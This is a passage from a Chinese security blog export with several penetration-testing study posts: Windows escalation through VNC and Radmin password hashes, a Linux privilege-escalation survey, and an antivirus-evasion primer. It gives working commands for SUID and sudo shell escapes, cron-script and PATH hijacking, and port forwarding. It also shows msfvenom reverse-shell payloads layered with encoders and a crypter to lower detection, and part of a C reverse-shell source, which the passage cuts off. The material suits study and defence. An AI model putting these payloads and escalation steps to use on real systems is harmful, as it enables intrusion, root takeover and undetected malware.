<p><strong>4、使用获取到的账号密码连接vnc</strong><br>通过本地的VNC客户端，连接成功后远程操作实现提权</p>
<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99711913" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99711913</a></p>
<h4 id="第三方软件Radmin提权"><a href="#第三方软件Radmin提权" class="headerlink" title="第三方软件Radmin提权"></a>第三方软件Radmin提权</h4><h5 id="Radmin简介"><a href="#Radmin简介" class="headerlink" title="Radmin简介"></a>Radmin简介</h5><ul>
<li>Radmin是平时在windows下用的比较多的一个远程管理工具。其具有支持多个连接和IP 过滤(即允许特定的IP控制远程机器)、个性化的档互传、远程关机、支持高分辨率模式、基于Windows NT的安全支持及密码保护以及提供日志文件支持等特性。</li>
<li>默认开放 <code>4899</code>端口</li>
<li>Radmin server2.X、Radmin server3.0都存在一个“致命”漏洞 —— radmin hash提权漏洞</li>
</ul>
<h5 id="提权思路-1"><a href="#提权思路-1" class="headerlink" title="提权思路"></a>提权思路</h5><p>老版本的Radmin会<code>在注册表中保留密码的Hash值</code>，通过WEBSHELL、远程挂马读取注册表中的密码Hash值并在本地破解密码进行远程连接来达到提权目的。</p>
<h5 id="提取步骤"><a href="#提取步骤" class="headerlink" title="提取步骤"></a>提取步骤</h5><p><strong>1、获取MD5Hash值</strong></p>
<pre><code>HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersParameter//默认密码注册表位置
HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersPort //默认端口注册表位置</code></pre><p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p>
<p><strong>3、查看远程屏幕</strong></p>
<p>在Radmin客户端选择屏幕控制，输入Hash值即可查看远程主机屏幕。</p>
<p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p>
<p><strong>5、登录远程桌面</strong></p>
<p>在本地打开远程桌面连接器，输入远端IP进行登录。</p>
]]></content>
  </entry>
  <entry>
    <title>linux提权总结(一)</title>
    <url>/2020/04/29/linux-ti-quan-zong-jie-yi/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>linux提权综述</title>
    <url>/2020/04/29/linux-ti-quan-zong-shu/</url>
    <content><![CDATA[<h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p>
<p>，要判断我们应该先对系统相关的信息进行收集。</p>
<h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul>
<li>已经拿到低权限shell</li>
<li>目标系统上有gcc</li>
<li>有上传文件的权限</li>
</ul>
<p><strong>使用命令</strong>：</p>
<pre><code>uname -a  或  uname -r</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p>
<p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p>
<p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p>
<p>这里在推荐一个很好用的工具</p>
<h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
<p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p>
<p>举个例子：</p>
<pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 3.0.0

Kernel local: 3.0.0

Possible Exploits:
[+] semtex
   CVE-2013-2094
   Source: www.exploit-db.com/download/25444/‎
[+] memodipper
   CVE-2012-0056
   Source: http://www.exploit-db.com/exploits/18411/
[+] perf_swevent
   CVE-2013-2094
   Source: http://www.exploit-db.com/download/26131</code></pre><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul>
<li>找到具备利用条件的exp</li>
<li>上传源代码</li>
<li>编译exp后执行</li>
</ul>
<h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><pre><code>漏洞描述：
漏洞编号：CVE-2016-5195
漏洞名称：脏牛（Dirty COW）
漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权
影响范围：Linux kernel &gt;=2.6.22 并且Android也受影响</code></pre><h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p>
<p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p>
<p>passwd 文件：</p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p>
<p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145009.png" alt=""></p>
<h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p>
<pre><code>ls -l /etc/passwd /etc/shadow</code></pre><h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul>
<li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li>
<li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li>
</ul>
<h4 id="4、sudo-滥用"><a href="#4、sudo-滥用" class="headerlink" title="4、sudo 滥用"></a><strong>4、sudo 滥用</strong></h4><p>sudo 大家经常遇到，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 /etc/sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p>
<p>查看可以执行哪些命令，即不需要知道 root 密码时，需验证自身普通权限的密码</p>
<p><code>sudo -l</code></p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429163933.png" alt=""></p>
<p>可以支持所有命令，下面参考这个网址:</p>
<blockquote>
<p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
</blockquote>
<p>这里以 awk、man 举例</p>
<p><strong>1、su</strong></p>
<blockquote>
<p>sudo su</p>
</blockquote>
<p>输入普通权限用户密码，切换为 root</p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164436.png" alt=""></p>
<p><strong>2、awk</strong></p>
<blockquote>
<p>sudo awk ‘BEGIN {system(“/bin/sh”)}’</p>
</blockquote>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164548.png" alt=""></p>
<p><strong>3、man</strong></p>
<blockquote>
<p>sudo man man</p>
</blockquote>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164826.png" alt=""></p>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164919.png" alt=""></p>
<blockquote>
</blockquote>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><blockquote>
<p>ls -l /etc/cron*</p>
</blockquote>
<p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p>
<p><strong>重写 python</strong></p>
<p>若这些计划任务的脚本可写，则编辑为 shell</p>
<p>crontab 文件是计划任务的配置，此文件只有 root 可写，我们不需要去修改 crontab，只查看里面的有哪些任务，比如定时执行了哪些脚本，再查看对应脚本的权限，若可写，则修改它。</p>
<p>测试：</p>
<blockquote>
<p>cat /etc/crontab</p>
</blockquote>
<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429165555.png" alt=""></p>
<p>我没有设置定时任务，模拟一下，如果里面有个 <code>1.python</code></p>
<blockquote>
<p>ls -al /tmp/1.py //查看是否有w权限 </p>
<p>cat -al /tmp/1.py //写入代码  import os os.system(‘cp /bin/sh /tmp/sh’) os.system(‘chmod u+s /tmp/sh’) </p>
</blockquote>
<p>当到了计划执行时间，就会以 root 权限执行 1.py，即将 /bin/sh 复制到 /tmp/sh</p>
<p>原本是没有 /tmp/sh</p>
<p>当执行 <code>sudo python 1.py</code> 时，就会复制到 /tmp/sh </p>
<p>我们只需要进入 /tmp，执行 ./sh 可获取 root</p>
<p>这里的 cp 命令是基于 SUID，给 1.py 设置 SUID 权限。可以结合环境变量方式，把 /tmp/sh 添加到环境变量，无需进入 /tmp/sh 去执行 ./sh，执行 sh 变为 root。也可以在 1.py 写入反弹 shell 的 python 代码，此时反弹的 shell 具有 root 权限</p>
<p><strong>防范：</strong> </p>
<p>crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>
<h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>​    SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行,ls 查看时有 s 属性才支持 SUID。比如passwd命令，就是以root权限运行来修改shadow的。</p>
<p>​    suid提权：</p>
<p>​    利用拥有suid的文件执行命令，从而提升权限至root</p>
<h5 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h5><p>常见可用来提权的linux可行性的文件列表如下：</p>
<ul>
<li>Nmap</li>
<li>Vim</li>
<li>find</li>
<li>Bash</li>
<li>More</li>
<li>Less</li>
<li>Nano</li>
<li>cp</li>
</ul>
<p>查找系统上运行的所有SUID可执行文件：</p>
<pre><code>1. find / -user root -perm -4000 -print 2&gt;/dev/null
2. find / -perm -u=s -type f 2&gt;/dev/null
3. find / -user root -perm -4000 -exec ls -ldb {} \;</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p>
<h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p>
<p>交互模式可以通过执行Nmap参数” interactive “</p>
<pre><code>nmap --interactive</code></pre><p>以下命令将提供一个提升的shell。</p>
<pre><code>nmap&gt; !sh
sh-3.2# whoami
root</code></pre><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p>
<pre><code>exploit/unix/local/setuid_nmap</code></pre><h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p>
<pre><code>touch pentestlab
find pentestlab -exec whoami \;</code></pre><pre><code>touch getflag
find / -type f -name getflag -exec &quot;whoami&quot; \;
find / -type f -name getflag -exec &quot;/bin/sh&quot; \;</code></pre><h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p>
<pre><code>vim.tiny /etc/shadow</code></pre><pre><code>vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell</code></pre><h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p>
<pre><code>bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(serv</code></pre><h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p>
<pre><code>less /etc/passwd
!/bin/sh</code></pre><h4 id="8、环境变量劫持-SUID-扩展"><a href="#8、环境变量劫持-SUID-扩展" class="headerlink" title="8、环境变量劫持-SUID 扩展"></a><strong>8、环境变量劫持-SUID 扩展</strong></h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p>
<p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p>
<p><strong>测试：</strong></p>
<p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p>
<pre class=" language-javascript"><code class="language-javascript">    cat <span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>ls <span class="token operator">&lt;</span><span class="token operator">&lt;</span>EOF  
    #<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python  
    print <span class="token string">"this is not the true cat"</span>  
    print <span class="token string">"here is a root shell!"</span>  
    <span class="token keyword">import</span> pty<span class="token punctuation">;</span>pty<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>  
    EOF</code></pre>
<p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p>
<h4 id="10、docker-组提权"><a href="#10、docker-组提权" class="headerlink" title="10、docker 组提权"></a><strong>10、docker 组提权</strong></h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p>
<p>可以参考我的这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p>
<h4 id="11、服务漏洞"><a href="#11、服务漏洞" class="headerlink" title="11、服务漏洞"></a><strong>11、服务漏洞</strong></h4><blockquote>
<p>netstat -antup #查看各种网络服务 </p>
</blockquote>
<p>然后把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限 windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发</p>
<p><strong>1、redis 反弹 shell</strong></p>
<p>nc 单向转发</p>
<blockquote>
<p>nc -l 12345 | nc 192.168.191.170 80</p>
</blockquote>
<p>双向转发</p>
<blockquote>
<p>mkfifo backpipe nc -l 12345 0&lt;backpipe | nc 192.168.191.170 80 1&gt;backpipe </p>
</blockquote>
<p>双向转发本人测试失败，希望大佬们提供解决的办法</p>
<p>socat</p>
<p>测试本地转发，service apache2 start，把 80 端口转发到其它端口，看是否能访问，这里测试成功 </p>
<blockquote>
<p>socat TCP-LISTEN:8080,fork TCP:192.168.191.170:80 </p>
</blockquote>
<p>这里可以参考这篇文章，作者先执行 ps -fu root，发现开放 redis 端口，把 redis 端口转发出来，利用 redis 反弹远程的 root shell。一次简单 linux 提权:</p>
<blockquote>
<p><a href="https://www.secquan.org/Discuss/1069715#reply8" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1069715#reply8</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>纵观渗透测试中的提权</title>
    <url>/2020/04/03/windows-chang-jian-ti-quan-fang-shi-zong-jie/</url>
    <content><![CDATA[<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文主要是为了总结渗透测试中我们常见的提权的思路与方式，不作详细步骤解释。</p>
<h3 id="提权的分类"><a href="#提权的分类" class="headerlink" title="提权的分类"></a>提权的分类</h3><p>提权的分类方法和分类角度有很多，这里我们选几种角度对其进行分类</p>
<h3 id="windows提权："><a href="#windows提权：" class="headerlink" title="windows提权："></a>windows提权：</h3><h4 id="一、本地提权"><a href="#一、本地提权" class="headerlink" title="一、本地提权"></a>一、本地提权</h4><h5 id="溢出提权："><a href="#溢出提权：" class="headerlink" title="溢出提权："></a>溢出提权：</h5><h6 id="1-远程溢出"><a href="#1-远程溢出" class="headerlink" title="1.远程溢出"></a>1.远程溢出</h6><p>​      远程溢出提权是指攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用响应的溢出程序，即可获取到远程服务器的root权限。</p>
<p>​    攻击者在攻击服务器时，使用远程溢出这种溢出攻击这种攻击手段是比较少的，服务器通常都打了漏洞补丁，这样旧的溢出漏洞一般不会再起作用，而新的溢出漏洞少之又少，可以说远程溢出漏洞已经”日落西山”了。</p>
<h6 id="2-本地溢出"><a href="#2-本地溢出" class="headerlink" title="2.本地溢出"></a>2.本地溢出</h6><p> 本地溢出提权首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限。</p>
<h5 id="Getpass-提权"><a href="#Getpass-提权" class="headerlink" title="Getpass 提权"></a>Getpass 提权</h5><h5 id="hash传递入侵"><a href="#hash传递入侵" class="headerlink" title="hash传递入侵"></a>hash传递入侵</h5><h5 id="lpk提权"><a href="#lpk提权" class="headerlink" title="lpk提权"></a>lpk提权</h5><h4 id="二、数据库提权"><a href="#二、数据库提权" class="headerlink" title="二、数据库提权"></a>二、数据库提权</h4><h5 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h5><ul>
<li><strong>功能型：</strong>udf提权</li>
<li><strong>技巧型：</strong>启动项提权</li>
<li><strong>漏洞型：</strong>mof提权</li>
</ul>
<h5 id="2-SQL-Server提权"><a href="#2-SQL-Server提权" class="headerlink" title="2.SQL Server提权"></a>2.SQL Server提权</h5><h5 id="3-Oracle提权"><a href="#3-Oracle提权" class="headerlink" title="3.Oracle提权"></a>3.Oracle提权</h5><ul>
<li>虚拟主机提权</li>
<li>星外提权</li>
<li>西部数码提权</li>
<li>华众虚拟主机提权</li>
</ul>
<h4 id="三、第三方软件提权"><a href="#三、第三方软件提权" class="headerlink" title="三、第三方软件提权"></a>三、第三方软件提权</h4><h5 id="1-FTP提权"><a href="#1-FTP提权" class="headerlink" title="1.FTP提权"></a>1.FTP提权</h5><ul>
<li>serv-u提权</li>
<li>G6-FTP提权</li>
<li>FileZilla提权</li>
<li>FlashFXP提权</li>
<li>PcAnywhere提权</li>
<li>Xlight FTP Server提权</li>
</ul>
<h5 id="2-远程软件提权"><a href="#2-远程软件提权" class="headerlink" title="2.远程软件提权"></a>2.远程软件提权</h5><ul>
<li>vnc</li>
<li>radmin</li>
</ul>
<h5 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h5><ul>
<li>Magic Winmail提权</li>
<li>navicat提权</li>
<li>zend</li>
<li>搜狗输入法提权</li>
<li>PR提权详解</li>
<li>巴西烤肉提权</li>
<li>利用360提权</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>提权方式</tag>
      </tags>
  </entry>
  <entry>
    <title>msf后渗透部分学习</title>
    <url>/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>渗透测试之免杀入门</title>
    <url>/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/</url>
    <content><![CDATA[<h2 id="渗透测试——免杀部分知识"><a href="#渗透测试——免杀部分知识" class="headerlink" title="渗透测试——免杀部分知识"></a>渗透测试——免杀部分知识</h2><h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1.恶意软件"></a>1.恶意软件</h4><ul>
<li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li>
<li>在用户非自愿的情况下执行安装<ul>
<li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li>
</ul>
</li>
</ul>
<h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2.防病毒软件"></a>2.防病毒软件</h4><ul>
<li>恶意程序最主要的防护手段<ul>
<li>杀毒软件/防病毒软件</li>
<li>客户端/服务器/邮件防病毒</li>
</ul>
</li>
<li>检测原理<ul>
<li>基于二进制文件中特征签名的黑名单检测方法</li>
<li>基于行为的分析方法（启发式）</li>
</ul>
</li>
<li>事后手段<ul>
<li>永远落后于病毒发展</li>
</ul>
</li>
</ul>
<h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3.免杀技术"></a>3.免杀技术</h4><ul>
<li>修改二进制文件中的特征字符<ul>
<li>替换、擦除、修改</li>
</ul>
</li>
<li>加密技术（crypter）<ul>
<li>通过加密是的特征字符不可读，从而逃避AV 检测</li>
<li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li>
</ul>
</li>
<li>防病毒软件的检测<ul>
<li>恶意程序本身的特征字符</li>
<li>加密器 cripter 的特征字符</li>
</ul>
</li>
</ul>
<h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4.当前现状"></a>4.当前现状</h4><ul>
<li>恶意软件制造者<ul>
<li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li>
<li>使用独有 crypter 软件加密恶意程序</li>
<li>处事低调，尽量避免被发现</li>
<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
<li>Fully UnDetectable 还最高追求 （FUD）</li>
</ul>
</li>
<li>AV 厂商<ul>
<li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li>
<li>一般新的恶意软件安全 UD 窗口期是一周左右</li>
<li>乐毅软件制造者永无休止的拉锯战</li>
<li>信的启发式检测技术尚有待完善(误杀漏杀)</li>
</ul>
</li>
<li>单一 AV 厂商的病毒库很难达到 100% 覆盖<ul>
<li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul>
<li>接口被某些国家的AV软禁免费利用，没有自己的病毒库</li>
</ul>
</li>
<li><a href="http://www.virscan.org/" target="_blank" rel="noopener">http://www.virscan.org/</a></li>
<li>在线多引擎查杀网站与 AV 查杀共享信息</li>
<li>搞黑的在线多引擎查毒站<ul>
<li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li>
<li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li>
</ul>
</li>
<li>常用的 RAT 软件<ul>
<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-生成病毒程序"><a href="#5-生成病毒程序" class="headerlink" title="5.生成病毒程序"></a>5.生成病毒程序</h4><h5 id="1-生成程序"><a href="#1-生成程序" class="headerlink" title="1.生成程序"></a>1.生成程序</h5><ul>
<li>生成反弹 shell</li>
</ul>
<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><ul>
<li>加密编码反弹 shell</li>
</ul>
<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.132 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o b.exe</code></pre><ul>
<li>比较编码前后的检测率<ul>
<li>未经过编码的 a.exe 检测率是 45%</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413174114743.png" alt="在这里插入图片描述"></p>
<h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul>
<li>利用模板隐藏 shell</li>
</ul>
<pre><code>  root@kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o c.exe</code></pre><ul>
<li>多重编码</li>
</ul>
<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; d.exe</code></pre><ul>
<li><p>比较编码前后的检测率</p>
<ul>
<li>未经过编码的 c.exe 检测率是 40%</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413174123784.png" alt="在这里插入图片描述"></p>
<ul>
<li>经过编码的 d.exe 检测率是 30%</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413174128295.png" alt="在这里插入图片描述"></p>
</li>
</ul>
<h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul>
<li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
<li>常被恶意软件用于免杀目的</li>
<li>Hyperion （32bit PE 程序加密器）</li>
<li>Crypter / Container（解密器 PE Loader ）</li>
</ul>
<pre><code>  root@kali:~# git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip
  root@kali:~# unzip Hyperion-1.2.zip
  root@kali:~# dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32

  # 生成加密器
  root@kali:~# cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe

  # 生成木马程序
  root@kali:~# msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe

  # 对木马程序进行加密
  root@kali:~# wine h.exe p.exe x.exe</code></pre><ul>
<li><p>比较编码前后的检测率</p>
<ul>
<li>未经过编码的 p.exe 检测率是 45%</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413174133640.png" alt="在这里插入图片描述"></p>
</li>
<li><p>未经过编码的 x.exe 检测率是 37%</p>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20190413174137778.png" alt="在这里插入图片描述"></p>
<h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul>
<li>Windows reverse shell</li>
</ul>
<pre><code>  root@kali:~# wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><ul>
<li>Linux shellg’c’c</li>
</ul>
<pre><code>  root@kali:~# gcc linux_revers_shell.c -o linux

  # 测试程序
  root@kali:~# nc -nvlp 333
  root@kali:~# ./linux 127.0.0.1 333</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174142304.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20190413174147316.png" alt="在这里插入图片描述"></p>
<ul>
<li>linux_revers_shell.c</li>
</ul>
<pre><code>  #include &lt;stdio.h&gt;
  #include &lt;sys/socket.h&gt;
  #include &lt;arpa/inet.h&gt;
  #include &lt;stdlib.h&gt;
  #include &lt;string.h&gt;
  #include &lt;unistd.h&gt;
  #include &lt;netinet/in.h&gt;

  int main(int argc, char *argv[])
  {
      struct sockaddr_in sock;
      int s;
      if (argc != 3)
      {
          fprintf(stderr, &quot;uso: 192.168.153.166 4444\n&quot;); exit(1);
      }
      sock.sin_family  = AF_INET;
      sock.sin_port = htons(atoi(argv[2]));
      sock.sin_addr.s_addr = inet_addr(argv[1]);
      s = socket(AF_INET, SOCK_STREAM, 0);

      connect(s,(struct sockaddr_in *)&amp;sock, sizeof(struct sockaddr_in));

      dup2(s,0);
      dup2(s,1);
